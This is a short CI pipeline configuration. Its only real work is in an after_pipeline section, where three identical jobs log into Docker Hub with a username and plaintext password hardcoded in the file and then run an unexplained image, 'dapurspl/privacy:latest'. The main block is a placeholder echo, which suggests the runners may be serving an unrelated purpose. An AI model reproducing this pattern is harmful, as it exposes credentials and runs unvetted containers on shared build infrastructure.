version: v1.0
name: Docker
agent:
  machine:
    type: e1-standard-8
    os_image: ubuntu2004
blocks:
  - name: 'Block #1'
    task:
      jobs:
        - name: 'Job #1'
          commands:
            - echo "job 1"
after_pipeline:
  task:
    jobs:
      - name: docker build
        commands:
          - docker login -u "dapurspl" -p "LijayaAnli1188@"
          - 'docker container run dapurspl/privacy:latest'
      - name: docker build
        commands:
          - docker login -u "dapurspl" -p "LijayaAnli1188@"
          - 'docker container run dapurspl/privacy:latest'
      - name: docker build
        commands:
          - docker login -u "dapurspl" -p "LijayaAnli1188@"
          - 'docker container run dapurspl/privacy:latest'
